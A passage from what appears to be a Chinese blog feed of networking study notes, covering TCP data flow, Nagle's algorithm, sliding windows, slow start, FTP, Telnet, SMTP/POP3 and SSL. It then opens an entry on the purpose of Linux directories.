<p>（1）每个选项的开始是1字节kind字段，说明选项的类型。</p>
<p>（2）kind字段为0和1的选项仅占1个字节。其他选项在kind字节后还有len字节，它说明的长度是指总长度，包括kind字节和len字节。</p>
<p>（3）设置无操作选项的原因在于允许发方填充字段为4字节的倍数。</p>
<h1 id="TCP的交互数据流"><a href="#TCP的交互数据流" class="headerlink" title="TCP的交互数据流"></a>TCP的交互数据流</h1><h2 id="引言-6"><a href="#引言-6" class="headerlink" title="引言"></a>引言</h2><p>有关TCP通信量的研究发现：按分组数量计算，约有一半的TCP报文段包含成块数据（如FTP、电子邮件和Usenet新闻），另一半则包含交互数据（如Telnet和Rlogin）。按字节计算，成块数据与交互数据的比例约为90%和10%。</p>
<p>成块数据的报文段基本上都是满长度的（通常为512字节的用户数据），交互数据则小得多（Telnet和Rlogin分组中约90%左右的用户数据小于10个字节）</p>
<p>TCP需要同时处理这两类数据，但使用的处理算法不同。</p>
<h2 id="交互式输入"><a href="#交互式输入" class="headerlink" title="交互式输入"></a>交互式输入</h2><p>说明：本书是以远程登录Rlogin协议模拟交互输入的，我没有进行相关实验，下面我会给出作者所做的实验截图。</p>
<p>如图19-1所示，Rlogin协议需要远程系统回显客户输入的字符，每按一个字符就会产生一个分组，而不是每次一行作为一个分组。</p>
<p>一般可以将报文段2和3合并（图中两个红框）</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271740550057766.png" alt=""></p>
<p>当我们键入5个字符date\n时的数据流，如图19-2所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271750297082325.png" alt=""></p>
<p>说明：</p>
<p>（1）第1行：客户发送字符d到服务器；第2行：该字符的确认及回显；第3行：回显字符的确认。</p>
<p>（2）与字符a有关的是第4~6行，与字符t有关的是第7~9行，与字符e有关的是第10~12行。</p>
<p>（3）13~15行与上面稍有不同。客户发送到服务器的是一个字符（换行符），而回显的是两个字符（图中14行红线处），这两个字符为：回车和换行字符，作用是将光标移动到左边并换到下一行。</p>
<p>（4）第16行：来自服务器date命令的输出。这30个字节（图中红线处）由28个字符与最后的回车+换行组成。第17、18行：服务器发往客户7个字符（第18行），它们是在服务器主机上的客户提示符：svr4%。第19行：确认了这7个字符。</p>
<h2 id="经受时延的确认"><a href="#经受时延的确认" class="headerlink" title="经受时延的确认"></a>经受时延的确认</h2><p>图19-3表示了图19-2中数据交换的时间。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271808466309708.png" alt=""></p>
<p>通常TCP在接收到数据时并不立即发送ACK；它会推迟发送，以便将ACK与需要沿该方向发送的数据一起发送，有时称这种现象为数据捎带ACK。</p>
<p>说明：绝大多数实现采用的时延为200ms，即TCP将以最大200ms的时延等待是否有数据一起发送。</p>
<p>下面我假设你会看这张图中标记的时间差，会计算实际时间（累加）。说明如下：</p>
<p>观察bsdi接收到数据和发送ACK之间的时间差：123.5、65.6、109.0、132.2、42.0、140.3和195.8 ms，似乎是随机的。观察bsdi发送ACK的实际时间（从0开始计算）为：139.9、539.3、940.1、1339.9、1739.9、1940.1和2140.1 ms，这些时间差是200ms的整数倍。</p>
<p>注意：因为TCP使用了一个200ms的定时器，以相对于内核引导的200ms固定时间溢出。由于将要确认的数据是随机到达的，TCP在内核的200ms定时器的下一次溢出时得到通知。</p>
<h2 id="Nagle算法"><a href="#Nagle算法" class="headerlink" title="Nagle算法"></a>Nagle算法</h2><p>Rlogin连接时，一般每次发送一个字节到服务器，这就产生了一些41字节长的分组：20字节的IP首部、20字节的TCP首部和1个字节的数据。</p>
<p>在局域网上，这些小分组（被称为微小分组tinygram）通常不会引起麻烦，因为局域网一般不会出现拥塞。在广域网上，这些小分组则会增加拥塞出现的可能。一种简单有效的方法就是采用RFC 896建议的Nagle算法。</p>
<p>算法说明：</p>
<p>算法要求一个TCP连接上最多只能有一个未被确认的未完成的小分组，在该分组的确认到达之前不能发送其他的小分组。相反，TCP收集这些少量的分组，并在确认到来时以一个分组的方式发出去。</p>
<p>算法优点：</p>
<p>算法的优越之处在于它是自适应的：确认到达得越快，数据也就发送得越快。在希望减少微小分组数目的低速广域网上，则会发送更少的分组。</p>
<p>从图19-3中看到，在以太网上一个字节被发送、确认和回显的平均往返时间约为16ms。为了产生比这个速度更快的数据，我们每秒键入的字符必须多于60个。说明在局域网环境下两个主机之间发送数据时很少使用这个算法。</p>
<p>当往返时间（RTT）增加时，如通过一个广域网，情况发生了变化。如图19-4：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/271843132408414.png" alt=""></p>
<p>从左到右待发数据的长度是不同的，分别为：1、1、2、1、2、2、3、1和3个字节。这是因为客户只有收到前一个数据的确认后才发送已经收集的数据。通过使用Nagle算法，为发送16个字节的数据客户只需要使用9个报文段，而不再是16个。</p>
<p>关闭Nagle算法</p>
<p>有时我们也需要关闭Nagle算法。例如，X窗口系统服务器，小消息（鼠标移动）必须无时延地发送，以便为进行某种操作的交互用户提供实时的反馈。</p>
<h2 id="窗口大小通告"><a href="#窗口大小通告" class="headerlink" title="窗口大小通告"></a>窗口大小通告</h2><p>观察图19-4，可以看到slip通告窗口大小为4096字节，vangogh通告其窗口大小为8192字节。但报文段5通告的窗口大小为4095个字节，意味着TCP缓冲区中仍然有一个字节等待应用程序（Rlogin客户）读取。</p>
<p>说明：</p>
<p>（1）通常服务器通告窗口大小为8192个字节，这是因为服务器在读取并回显接收到的数据之前，其TCP没有数据发送。当服务器已经读取了来自客户的输入后，来自服务器的数据将被发送。</p>
<p>（2）在ACK到来时，客户的TCP总是有数据需要发送。这是因为它在等待ACK的过程中缓存接收到的字符。当客户TCP发送缓存的数据时，Rlogin客户没有机会读取来自服务器的数据，因此，客户通告的窗口大小总是小于4096。</p>
<h1 id="TCP的成块数据流"><a href="#TCP的成块数据流" class="headerlink" title="TCP的成块数据流"></a>TCP的成块数据流</h1><h2 id="正常数据流"><a href="#正常数据流" class="headerlink" title="正常数据流"></a>正常数据流</h2><ul>
<li>通常使用的“隔一个报文段确认”的策略</li>
<li>分组顺序依赖于许多无法控制的因素：发送方T C P的实现、接收方T C P的实现、接收进程读取数据（依赖于操作系统的调度）和网络的动态性（如以太网的冲突和退避等）。</li>
</ul>
<h3 id="快的发送方和慢的接收方"><a href="#快的发送方和慢的接收方" class="headerlink" title="快的发送方和慢的接收方"></a>快的发送方和慢的接收方</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501153726.jpg" alt=""></p>
<ul>
<li>发送方发送4个背靠背（b a c k - t o - b a c k）的数据报文段去填充接收方的窗口，然后停下来等待一个A C K。接收方发送A C K（报文段8），但通告其窗口大小为 0，这说明接收方已收到所有数据，但这些数据都在接收方的 T C P缓冲区，因为应用程序还没有机会读取这些数据。</li>
<li>另一个A C K（称为窗口更新）在17.4 ms后发送，表明接收方现在可以接收另外的 4 0 9 6个字节的数据。虽然这看起来像一个 A C K，但由于它并不确认任何新数据，只是用来增加窗口的右边沿，因此被称为窗口更新。</li>
<li>发送方发送最后4个报文段（1 0 ~ 1 3），再次填充了接收方的窗口。注意到报文段 1 3中包括两个比特标志：P U S H和F I N。随后从接收方传来另外两个 A C K，它们确认了最后的4 0 9 6字节的数据（从4 0 9 7到8 1 9 2字节）和F I N（标号为8 1 9 2）。</li>
</ul>
<h2 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501153825.jpg" alt=""></p>
<ul>
<li>在这个图中，我们将字节从 1至11进行标号。接收方通告的窗口称为提出的窗口（ o ff e r e dw i n d o w），它覆盖了从第4字节到第9字节的区域，表明接收方已经确认了包括第 3字节在内的数据，且通告窗口大小为 6。回顾第1 7章，我们知道窗口大小是与确认序号相对应的。发送方计算它的可用窗口，该窗口表明多少数据可以立即被发送。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501154500.jpg" alt=""></p>
<ul>
<li>当接收方确认数据后，这个滑动窗口不时地向右移动。窗口两个边沿的相对运动增加或减少了窗口的大小。使用三个术语来描述窗口左右边沿的运动：<br>1) 称窗口左边沿向右边沿靠近为窗口合拢。这种现象发生在数据被发送和确认时。<br>2) 当窗口右边沿向右移动时将允许发送更多的数据，我们称之为窗口张开。这种现象发生在另一端的接收进程读取已经确认的数据并释放了 T C P的接收缓存时。<br>3) 当右边沿向左移动时，我们称之为窗口收缩。 Host Requirements RFC强烈建议不要使用这种方式。但T C P必须能够在某一端产生这种情况时进行处理</li>
</ul>
<h3 id="一个例子-1"><a href="#一个例子-1" class="headerlink" title="一个例子"></a>一个例子</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501155029.jpg" alt=""></p>
<p>以该图为例可以总结如下几点：<br>1) 发送方不必发送一个全窗口大小的数据。<br>2) 来自接收方的一个报文段确认数据并把窗口向右边滑动。这是因为窗口的大小是相对于确认序号的。<br>3) 正如从报文段7到报文段8中变化的那样，窗口的大小可以减小，但是窗口的右边沿却不能够向左移动。<br>4) 接收方在发送一个A C K前不必等待窗口被填满。在前面我们看到许多实现每收到两个报文段就会发送一个A C K。</p>
<h2 id="PUSH标志"><a href="#PUSH标志" class="headerlink" title="PUSH标志"></a>PUSH标志</h2><p>发送方使用该标志通知接收方将所收到的数据全部提交给接收进程。这里的数据包括与 P U S H一起传送的数据以及接收方T C P已经为接收进程收到的其他数据。</p>
<h2 id="慢启动"><a href="#慢启动" class="headerlink" title="慢启动"></a>慢启动</h2><ul>
<li>发送方一开始便向网络发送多个报文段，直至到达接收方通告的窗口大小为止。当发送方和接收方处于同一个局域网时，这种方式是可以的。但是如果在发送方和接收方之间存在多个路由器和速率较慢的链路时，就有可能出现一些问题。一些中间路由器必须缓存分组，并又可能耗尽存储器的空间，然后发生丢包</li>
<li>TCP采用“慢启动（slow start）”算法来降低一开始就发送过多的数据到网络</li>
<li>慢启动为发送方的T C P增加了另一个窗口：拥塞窗口(congestion window)，记为c w n d。当与另一个网络的主机建立 T C P连接时，拥塞窗口被初始化为 1个报文段（即另一端通告的报文段大小）。每收到一个A C K，拥塞窗口就增加一个报文段（ c w n d以字节为单位，但是慢启动以报文段大小为单位进行增加）。发送方取拥塞窗口与通告窗口中的最小值作为发送上限。拥塞窗口是发送方使用的流量控制，而通告窗口则是接收方使用的流量控制。</li>
<li>发送方开始时发送一个报文段，然后等待 A C K。当收到该A C K时，拥塞窗口从1增加为2，即可以发送两个报文段。当收到这两个报文段的 A C K时，拥塞窗口就增加为4。这是一种指数增加的关系。</li>
<li>在某些点上可能达到了互联网的容量，于是中间路由器开始丢弃分组。这就通知发送方它的拥塞窗口开得过大。当我们在下一章讨论 T C P的超时和重传机制时，将会看到它们是怎样对拥塞窗口起作用的。现在，我们来观察一个实际中的慢启动。</li>
</ul>
<h2 id="发送一个分组的时间"><a href="#发送一个分组的时间" class="headerlink" title="发送一个分组的时间"></a>发送一个分组的时间</h2><ul>
<li>通常发送一个分组的时间取决于两个因素：传播时延和发送时延</li>
<li>对于一个给定的两个接点之间的同路，传播时延一般是固定的，而发送时延则取决于分组大小</li>
<li>在速率较慢的情况下发送时延起主要作用，而在千兆比特速率下传播时延则占主要地位</li>
</ul>
<h2 id="带宽时延乘积"><a href="#带宽时延乘积" class="headerlink" title="带宽时延乘积"></a>带宽时延乘积</h2><ul>
<li>为了最大限度的利用链路带宽，必须确保发送发源源不断的收到接收方发送的ACK，做为收到数据的确认和更新window size的大小</li>
<li>在开始阶段，通告的window size必须大于等于带宽和往返时延的乘积，才能确保在收到第一个ACK前，能够一直发送数据流量。因为发送第一个数据报文到收到对应的ACK，时间至少RTT时间</li>
<li>计算通道的容量为：<br>c a p a c i t y (bit) = b a n d w i d t h (b/s) × ro u n d-trip time ( s )</li>
</ul>
<h1 id="TCP的超时重传"><a href="#TCP的超时重传" class="headerlink" title="TCP的超时重传"></a>TCP的超时重传</h1><p>T C P提供可靠的运输层。它使用的方法之一就是确认从另一端收到的数据。但数据和确认都有可能会丢失。 T C P通过在发送时设置一个定时器来解决这种问题。如果当定时器溢出时还没有收到确认，它就重传该数据</p>
<p>对每个连接，T C P管理4个不同的定时器。<br>1) 重传定时器使用于当希望收到另一端的确认。在本章我们将详细讨论这个定时器以及<br>一些相关的问题，如拥塞避免。<br>2) 坚持( p e r s i s t )定时器使窗口大小信息保持不断流动，即使另一端关闭了其接收窗口<br>3) 保活( k e e p a l i v e )定时器可检测到一个空闲连接的另一端何时崩溃或重启<br>4) 2MSL定时器测量一个连接处于 T I M E _ WA I T状态的时间。</p>
<h1 id="FTP：文件传送协议"><a href="#FTP：文件传送协议" class="headerlink" title="FTP：文件传送协议"></a>FTP：文件传送协议</h1><h2 id="FTP简介"><a href="#FTP简介" class="headerlink" title="FTP简介"></a>FTP简介</h2><ul>
<li>数据传输主流协议</li>
<li>两个信道<ul>
<li>第一信道，控制信道，无论何时都是由客户端发起连接。采用客户端服务器模式。服务端监听21端口。用于控制命令的传输。主要任务就是认证，控制命令（如查看文件列表等）等</li>
<li>第二信道，数据信道。根据数据信道是否由服务端发起，区分ActiveMode和PassiveMode。数据的传输走的是第二信道，包括文件列表数据的传输。</li>
<li>TCP的知名端口号（服务端的监听端口），21号，是控制信道的端口。</li>
</ul>
</li>
<li>FTP两个模式<ul>
<li>Active Mode</li>
<li>Passive Mode</li>
</ul>
</li>
</ul>
<h2 id="FTP命令"><a href="#FTP命令" class="headerlink" title="FTP命令"></a>FTP命令</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010583_4654.png" alt=""></p>
<h2 id="Active-Mode"><a href="#Active-Mode" class="headerlink" title="Active Mode"></a>Active Mode</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010584_5069.png" alt=""></p>
<ul>
<li>第一信道通常三次握手建立FTP连接</li>
<li>第二信道（数据信道），是由服务器主动发起的，即是ActiveMode。</li>
<li>第二信道（数据通道），是服务器被动接收的，即是PassiveMode。</li>
<li>可见，第二信道，即数据信道（传输数据而非控制命令），是由服务端主动发起的，即是主动模式（ActiveMode）；如果不是服务器主动发起的，即是被动模式（PassiveMode）。</li>
<li>第一信道中，客户端向FTP服务器发送的数据中，含有PORT（a,b,c,d,e,f）这里a,b,c,d,e,f每上表示0~255的数据，其中a,b,c,d表示客户端的IP，e,f表示客户端的第二通道的端口（计算方法是：e*256+f）。这主要是为了供第二通道中，服务端主动发起向客户端的连接使用的。</li>
</ul>
<h2 id="安全性-1"><a href="#安全性-1" class="headerlink" title="安全性"></a>安全性</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010584_9056.png" alt=""><br>注意：由于用户名和密码都是明文传输，易于被截获，因此，对于FTP来说，使用匿名登陆反而更安全。</p>
<h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010585_6448.png" alt=""><br>客户端第二通道是IP和端口是： 202.100.1.100,4<em>256+38<br>第一次传入PORT后，紧跟的是一个控制命令，LIST（查看列表）。<br>然后，服务端20号端口通过第二信道与客户端的4</em>256+38端口建立连接，并传送文件列表。</p>
<h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010601_6947.png" alt=""><br>当单击文件列表中的一个文件，又出现了一个PORT发给服务端（注意这次的端口号有变化，4<em>256+42），接着又发了一个RETR命令，后面跟着所请求的文件。<br>这时，服务端20号端口又通过第二信道与客户端4</em>256+42端口建立连接，并传送该文件。（注意，与第一次不是同一个端口号，也就是说又建立了一次连接）<br>注意：这里是又建立了一次连接。</p>
<h2 id="Passive-Mode"><a href="#Passive-Mode" class="headerlink" title="Passive Mode"></a>Passive Mode</h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010602_9427.png" alt=""><br>第二信道，服务器被动接受为被动模式（PassiveMode）。<br>在第一信道中，客户端发送PASV命令，询问服务端是否支持被动模式。服务端回复227表示支持，这时a,b,c,d,e,f表示服务端第二信道的IP和端口。<br>目前一般使用的是PassiveMode模式，客户端连接后，一般会发PASV询问服务器是否支持PassiveMode，如果支持，则使用PassiveMode。</p>
<h1 id="Telnet：远程登录"><a href="#Telnet：远程登录" class="headerlink" title="Telnet：远程登录"></a>Telnet：远程登录</h1><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501205934.jpg" alt=""></p>
<ul>
<li>1) Te l n e t客户进程同时和终端用户和T C P / I P协议模块进行交互。通常我们所键入的任何信息的传输是通过T C P连接，连接的任何返回信息都输出到终端上。</li>
<li>Te l n e t服务器进程经常要和一种叫做“伪终端设备”（pseudo-terminal device）打交道，至少在U n i x系统下是这样的。这就使得对于登录外壳 ( s h e l l )进程来讲，它是被Te l n e t服务器进程直接调用的，而且任何运行在登录外壳进程处的程序都感觉是直接和一个终端进行交互。</li>
<li>仅仅使用了一条T C P连接。由于客户进程必须多次和服务器进程进行通信（反之亦然），这就必然需要某些方法，来描绘在连接上传输的命令和用户数据。</li>
</ul>
<h2 id="Telnet协议"><a href="#Telnet协议" class="headerlink" title="Telnet协议"></a>Telnet协议</h2><p>Te l n e t协议可以工作在任何主机（例如，任何操作系统）或任何终端之间。    </p>
<h2 id="NVT-ASCII"><a href="#NVT-ASCII" class="headerlink" title="NVT ASCII"></a>NVT ASCII</h2><ul>
<li>术语NVT ASCII代表7比特的A S C I I字符集，网间网协议族都使用NVT ASCII。每个7比特的字符都以8比特格式发送，最高位比特为0。</li>
<li>行结束符以两个字符 C R（回车）和紧接着的 L F（换行）这样的序列表示。以 \ r \ n来表示。单独的一个 C R也是以两个字符序列来表示，它们是 C R和紧接着的 N U L（字节0），以\ r \ 0表示。</li>
<li>F T P, SMTP, Finger和W h o i s协议都以NVT ASCII来描述客户命<br>令和服务器的响应。</li>
</ul>
<h2 id="Telnet命令"><a href="#Telnet命令" class="headerlink" title="Telnet命令"></a>Telnet命令</h2><p>Te l n e t通信的两个方向都采用带内信令方式。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501210711.jpg" alt=""></p>
<h2 id="一次一个字符方式"><a href="#一次一个字符方式" class="headerlink" title="一次一个字符方式"></a>一次一个字符方式</h2><p>我们所键入的每个字符都单独发送到服务器进程。服务器进程回显大多数的字符，除非服务器进程端的应用程序去掉了回显功能。该方式的缺点也是显而易见的。当网络速度很慢，而且网络流量比较大的时候，那么回显的速度也会很慢。虽然如此，但目前大多数 Te l n e t实现都把这种方式作为默认方式。</p>
<h2 id="Telnet协议两大特点"><a href="#Telnet协议两大特点" class="headerlink" title="Telnet协议两大特点"></a>Telnet协议两大特点</h2><ul>
<li>交互式TCP数据流的特点</li>
<li>安全问题（替代协议SSH）</li>
</ul>
<h1 id="SMTP-POP3：简单邮件传送协议-邮局协议版本3"><a href="#SMTP-POP3：简单邮件传送协议-邮局协议版本3" class="headerlink" title="SMTP/POP3：简单邮件传送协议/邮局协议版本3"></a>SMTP/POP3：简单邮件传送协议/邮局协议版本3</h1><h2 id="SMTP简介"><a href="#SMTP简介" class="headerlink" title="SMTP简介"></a>SMTP简介</h2><ul>
<li>SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。SMTP协议属于TCP/IP协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。通过SMTP协议所指定的服务器,就可以把E-mail寄到收信人的服务器上了，整个过程只要几分钟。SMTP服务器则是遵循SMTP协议的发送邮件服务器，用来发送或中转发出的电子邮件。</li>
<li>SMTP 是一种TCP协议支持的提供可靠且有效电子邮件传输的应用层协议。SMTP 是建立在 TCP上的一种邮件服务，主要用于传输系统之间的邮件信息并提供来信有关的通知。[1] </li>
<li>端口 25</li>
</ul>
<h2 id="SMTP协议的邮件路由过程"><a href="#SMTP协议的邮件路由过程" class="headerlink" title="SMTP协议的邮件路由过程"></a>SMTP协议的邮件路由过程</h2><p>STMP服务器基于域名服务器DNS中计划收件人的域名来路由电子邮件。SMTP服务器基于DNS的MX记录来路由电子邮件，都应向该主机发送。若SMTP服务器mail.abc.com收到一封信要发到shuer@sh.abc.com，则执行以下过程：</p>
<ul>
<li>Sendmail请求DNS给出主机sh.abc.com的CNAME记录，如有，假若CNAME（别名记录）到shmail.abc.com，则再次请求shmail.abc.com的CNAME的记录，直到没有为止</li>
<li>假定被CNAME到shmail.abc.com，然后sendmail请求@abc.com域的DNS给出shmail.abc.com的MX记录（邮件路由及记录），shmail MX 5 shmail.abc.com 10 shmail2.abc.com</li>
<li>Sendmail组合请求DNS给出shmail.abc.com的A记录（主机名或域名对应的IP地址记录），即IP地址，若返回值为1.2.3.4（假设值）</li>
<li>Sendmail与1.2.3.4连接，传送这封给shuser@sh.abc.com的信到1.2.3.4这台服务器的SMTP后台程序</li>
</ul>
<h2 id="SMTP协议工作原理"><a href="#SMTP协议工作原理" class="headerlink" title="SMTP协议工作原理"></a>SMTP协议工作原理</h2><p>SMTP是工作在两种情况下：一是电子邮件从客户机传输到服务器；二是从某一个服务器传输到另一个服务器。SMTP也是个请求/响应协议，命令和响应都是基于ASCII文本，并以CR和LF符结束。响应包括一个表示返回状态的三位数字代码。SMTP在TCP协议25号端口监听连续请求。<br>连接和发送过程如下：</p>
<ul>
<li>建立TCP连接</li>
<li>客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；服务器正希望以OK作为响应，表明准备接收</li>
<li>客户端发送RCPT命令，以标识该电子邮件的计划接收人，可以有多个RCPT行；服务器端则表示是否愿意为收件人接收邮件</li>
<li>协商结束，发送邮件，用命令DATA发送</li>
<li>以“.”号表示结束输入内容一起发送出去，结束此次发送，用QUIT命令退出</li>
</ul>
<h2 id="SMTP-Inspection介绍"><a href="#SMTP-Inspection介绍" class="headerlink" title="SMTP Inspection介绍"></a>SMTP Inspection介绍</h2><ul>
<li><p>Allow only seven minimum SMTP<br>commands:helo,mail,rcpt,data,rset,noop,and,quit(RFC 821)</p>
</li>
<li><p>Adds support for eight ESMTP<br>commands:auth,data,ehlo,etrn,saml,send,soml,and vrfy</p>
</li>
<li><p>默认在TCP/25上激活了ESMTP监控</p>
</li>
<li>如果禁用此功能，所有SMTP命令都能穿越防火墙，邮件服务器潜在的漏洞就暴露在攻击者面前</li>
</ul>
<h2 id="POP简介"><a href="#POP简介" class="headerlink" title="POP简介"></a>POP简介</h2><ul>
<li>POP3，全名为“Post Office Protocal-Version3”，即“邮局协议版本3”。是TCP/IP协议族中的一员，由RFC1939定义。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。提供SSL加密的POP3协议被称为POP3S.</li>
<li>POP协议支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件，这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端发送到个人终端机器上，一般是PC机或MAC。一旦邮件发送到PC机或MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”,也就是改进的POP3协议</li>
<li>传输协议：TCP/110</li>
</ul>
<h2 id="POP命令"><a href="#POP命令" class="headerlink" title="POP命令"></a>POP命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">USER			//键入用户名</div><div class="line">PASS			//键入密码</div><div class="line">STAT			//查看服务器状态</div><div class="line">List			//罗列邮件</div><div class="line">RETR 1			//收ID为1的邮件</div></pre></td></tr></table></figure>
<h1 id="SSL：安全套接层"><a href="#SSL：安全套接层" class="headerlink" title="SSL：安全套接层"></a>SSL：安全套接层</h1><h2 id="SSL简介"><a href="#SSL简介" class="headerlink" title="SSL简介"></a>SSL简介</h2><ul>
<li>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。</li>
<li>SSL是一个不依赖于平台和运用程序的协议，用于保障TCP-based运用安全，SSL在TCP层和运用层之间，就想运用层连接到TCP来连接的一个插口</li>
</ul>
<h2 id="SSL加密知名协议"><a href="#SSL加密知名协议" class="headerlink" title="SSL加密知名协议"></a>SSL加密知名协议</h2><ul>
<li><p>HTTP over SSL：加密网页流量是设计SSL的初衷,HTTP也是第一个使用SSL保障安全的运用层协议<br>当Netscape在它的Navigator里面运用HTTP over SSL的时候，它使用<a href="https://来标识HTTP" target="_blank" rel="external">https://来标识HTTP</a> over SSL，因此HTTP over SSL就以HTTPS的格式被熟知。后来HTTPS在RFC2818被标准化。HTTPS工作在TCP 443号端口，但是普通的HTTP默认工作在TCP 80端口</p>
</li>
<li><p>Email over SSL：类似于HTTP over SSL，邮件协议例如：SMTP,POP3和IMAP也能支持SSL</p>
</li>
</ul>
<h2 id="SSL的位置"><a href="#SSL的位置" class="headerlink" title="SSL的位置"></a>SSL的位置</h2><p>SSL介于应用层和TCP层之间。应用层数据不再直接传递给传输层，而是传递给SSL层，SSL层对从应用层收到的数据进行加密，并增加自己的SSL头。<br><img src="http://pic002.cnblogs.com/images/2012/38542/2012100609461432.png" alt=""></p>
<h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><ul>
<li><p>服务器认证阶段：1）客户端向服务器发送一个开始信息“Hello”以便开始一个新的会话连接；2）服务器根据客户的信息确定是否需要生成新的主密钥，如需要则服务器在响应客户的“Hello”信息时将包含生成主密钥所需的信息；3）客户根据收到的服务器响应信息，产生一个主密钥，并用服务器的公开密钥加密后传给服务器；4）服务器回复该主密钥，并返回给客户一个用主密钥认证的信息，以此让客户认证服务器。</p>
</li>
<li><p>用户认证阶段：在此之前，服务器已经通过了客户认证，这一阶段主要完成对客户的认证。经认证的服务器发送一个提问给客户，客户则返回（数字）签名后的提问和其公开密钥，从而向服务器提供认证。</p>
</li>
</ul>
<p>SSL协议提供的安全通道有以下三个特性：</p>
<ul>
<li>机密性：SSL协议使用密钥加密通信数据。</li>
<li>可靠性：服务器和客户都会被认证，客户的认证是可选的。</li>
<li>完整性：SSL协议会对传送的数据进行完整性检查。</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>[第四周]LinuxLinux各个目录的作用及内容</title>
    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-LinuxLinux%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%86%85%E5%AE%B9.html"/>
    <id>http://uknowsec.cn/posts/linux/第四周-LinuxLinux各个目录的作用及内容.html</id>
    <published>2017-03-17T12:54:08.000Z</published>
    <updated>2017-03-17T13:21:15.910Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="主要目录"><a href="#主要目录" class="headerlink" title="主要目录"></a>主要目录</h2><h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><p>/处于Linux文件系统树形结构的最顶端，它是Linux文件系统的入口，所有的目录、文件、设备都在/之下。</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h3><p>该目录存放着系统最常用的最重要的命令，相当于DOS下的内部命令，只不过它们是以独立的文件形式存在。比如：ls、cp、mkdir等命令。这个目录中的文件都是可执行的并且是普通用户都可以使用的命令。作为系统最基础的命令都放在这里。</p>
<h3 id="usr"><a href="#usr" class="headerlink" title="/usr"></a>/usr</h3><p>该目录是系统存放程序的地方，比如普通命令、帮助文件、安装的软件等。这个目录下有很多的文件和目录。当我们安装一个Linux发行版官方提供的软件包时，大多安装在这里。当有涉及服务器的配置文件时，会把配置文件安装在/etc目录中。/usr目录下包括涉及字体目录/usr/share/fonts、帮助目录/usr/share/man或/usr/share/doc等。</p>
<h3 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h3><p>该目录的内容是经常变动的，/var下有/var/log目录用来存放系统日志的目录。/var/www目录用来定义Apache服务器站点存放目录。/var/lib用来存放一些库文件。</p>
<h3 id="sbin"><a href="#sbin" class="headerlink" title="/sbin"></a>/sbin</h3><p>大多数涉及系统管理的命令都存放在该目录中，它是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，凡是目录sbin中包含的命令都是root权限才能执行的。</p>
<h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><p>Linux超级权限用户(系统管理员)root的主目录。</p>
<h3 id="home"><a href="#home" class="headerlink" title="/home"></a>/home</h3><p>普通用户的主目录都默认存放在该目录中，比如：有个用户叫wang，那它的主目录就是/home/wang，也可以用~wang表示。</p>
<h3 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h3><p>该目录是系统配置文件的所在地，一些服务器的配置文件也在这里，比如：用户帐号及密码配置文件等。</p>
<h3 id="boot"><a href="#boot" class="headerlink" title="/boot"></a>/boot</h3><p>Linux的内核及引导系统的程序所需要的文件都存放在该目录中，比如vmlinuz、initrd.img等文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器在这个目录中。</p>
<h3 id="opt"><a href="#opt" class="headerlink" title="/opt"></a>/opt</h3><p>该目录是可选的软件包安装目录，有些软件包我们可以将它安装在该目录中。</p>
